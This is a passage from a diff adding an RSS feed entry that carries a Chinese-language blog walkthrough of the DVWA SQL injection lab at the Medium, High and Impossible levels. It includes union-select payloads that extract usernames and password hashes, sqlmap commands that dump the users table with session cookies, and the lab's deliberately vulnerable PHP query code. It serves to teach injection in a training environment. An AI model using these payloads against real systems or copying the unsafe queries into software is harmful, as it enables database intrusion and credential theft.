+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>提取字段名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select 1,column_name from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735723.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735723.png" 
+             alt="image-20240412102804247" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>提取user、password的值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select user,password from users#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735724.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735724.png" 
+             alt="image-20240412102914074" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>SQLmap工具使用</p>
+<p>将第一步抓到的数据保存在桌面，命名为1.txt文件</p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735725.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735725.png" 
+             alt="image-20240603112004596" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>使用 <code>-r</code> 参数指定文件路径。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie &#34;PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=medium&#34; --batch --dbs
+</span></span><span class="line"><span class="cl">// -r REQUESTFILE      从文件中读取 HTTP 请求
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735726.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735726.png" 
+             alt="image-20240603101812626" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>操作步骤与前面一致，最后得到user、password数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie &#34;PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=medium&#34; --batch -D dvwa -T users -C user,password --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735727.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735727.png" 
+             alt="image-20240603102226671" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;Submit&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get input
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$id</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">],</span> <span class="nv">$id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//ysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//在以下字符前添加反斜线：\x00、\n、\r、\、&#39;、&#34; 和 \x1a.
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$query</span>  <span class="o">=</span> <span class="s2">&#34;SELECT first_name, last_name FROM users WHERE user_id = </span><span class="si">$id</span><span class="s2">;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">],</span> <span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get results
+</span></span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span> <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_assoc</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Display values
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$first</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&#34;first_name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$last</span>  <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&#34;last_name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$html</span> <span class="o">.=</span> <span class="s2">&#34;&lt;pre&gt;ID: </span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">&lt;br /&gt;First name: </span><span class="si">{</span><span class="nv">$first</span><span class="si">}</span><span class="s2">&lt;br /&gt;Surname: </span><span class="si">{</span><span class="nv">$last</span><span class="si">}</span><span class="s2">&lt;/pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// This is used later on in the index.php page
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Setting it here so we can close the database connection in here like in the rest of the source scripts
+</span></span></span><span class="line"><span class="cl"><span class="nv">$query</span>  <span class="o">=</span> <span class="s2">&#34;SELECT COUNT(*) FROM users;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">],</span>  <span class="nv">$query</span> <span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="p">((</span><span class="nx">is_object</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">]))</span> <span class="o">?</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">])</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$___mysqli_res</span> <span class="o">=</span> <span class="nx">mysqli_connect_error</span><span class="p">())</span> <span class="o">?</span> <span class="nv">$___mysqli_res</span> <span class="o">:</span> <span class="k">false</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$number_of_rows</span> <span class="o">=</span> <span class="nx">mysqli_fetch_row</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="high">High</h3>
+<p>1、点击链接弹出小窗，提交1，使用BurpSuite抓包。</p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735728.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735728.png" 
+             alt="image-20240603092627559" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735729.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735729.png" 
+             alt="image-20240603092835322" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>尝试放包，回显信息出现在原页面</p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735730.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735730.png" 
+             alt="image-20240603093053482" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>2、注入方式与Low、Medium级别一致，最后得到user、password数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; union select user,password from users#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735731.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735731.png" 
+             alt="image-20240603093607403" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>SQLmap工具使用</p>
+<p>因为提交数据与回显数据的页面不同，所以需要添加第二个回显地址。将第一步抓到的数据保存在桌面，命名为1.txt文件，使用 <code>-r</code> 参数指定文件路径。 <code>--second-url</code> 参数指定会先页面URL。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url &#34;http://dvwa/vulnerabilities/sqli/&#34; --cookie &#34;PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=high&#34; --batch --dbs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735732.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735732.png" 
+             alt="image-20240603100335290" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>操作步骤与前面一致，最后得到user、password数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url &#34;http://dvwa/vulnerabilities/sqli/&#34; --cookie &#34;PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=high&#34; --batch -D dvwa -T users -C user,password --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735733.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735733.png" 
+             alt="image-20240603101120077" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_SESSION</span> <span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get input
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Check database
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$query</span>  <span class="o">=</span> <span class="s2">&#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 1;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">],</span> <span class="nv">$query</span> <span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span> <span class="s1">&#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get results
+</span></span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span> <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_assoc</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Get values
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$first</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&#34;first_name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$last</span>  <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&#34;last_name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$html</span> <span class="o">.=</span> <span class="s2">&#34;&lt;pre&gt;ID: </span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">&lt;br /&gt;First name: </span><span class="si">{</span><span class="nv">$first</span><span class="si">}</span><span class="s2">&lt;br /&gt;Surname: </span><span class="si">{</span><span class="nv">$last</span><span class="si">}</span><span class="s2">&lt;/pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">((</span><span class="nx">is_null</span><span class="p">(</span><span class="nv">$___mysqli_res</span> <span class="o">=</span> <span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">])))</span> <span class="o">?</span> <span class="k">false</span> <span class="o">:</span> <span class="nv">$___mysqli_res</span><span class="p">);</span>		
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="impossible">Impossible</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;Submit&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Check Anti-CSRF token
+</span></span></span><span class="line"><span class="cl">    <span class="nx">checkToken</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="s1">&#39;user_token&#39;</span> <span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span> <span class="s1">&#39;session_token&#39;</span> <span class="p">],</span> <span class="s1">&#39;index.php&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Get input
+</span></span></span><span class="line"><span class="cl">    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Was a number entered?
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span> <span class="nv">$id</span> <span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">       <span class="c1">// Check the database
+</span></span></span><span class="line"><span class="cl">       <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span> <span class="s1">&#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">       <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span> <span class="s1">&#39;:id&#39;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">       <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">       <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="c1">// Make sure only 1 result is returned
+</span></span></span><span class="line"><span class="cl">       <span class="k">if</span><span class="p">(</span> <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">rowCount</span><span class="p">()</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="c1">// Get values
+</span></span></span><span class="line"><span class="cl">          <span class="nv">$first</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span> <span class="s1">&#39;first_name&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$last</span>  <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span> <span class="s1">&#39;last_name&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">          <span class="nv">$html</span> <span class="o">.=</span> <span class="s2">&#34;&lt;pre&gt;ID: </span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">&lt;br /&gt;First name: </span><span class="si">{</span><span class="nv">$first</span><span class="si">}</span><span class="s2">&lt;br /&gt;Surname: </span><span class="si">{</span><span class="nv">$last</span><span class="si">}</span><span class="s2">&lt;/pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">       <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Generate Anti-CSRF token
+</span></span></span><span class="line"><span class="cl"><span class="nx">generateSessionToken</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div>]]></content:encoded>
+    </item>
+  </channel>
+</rss>
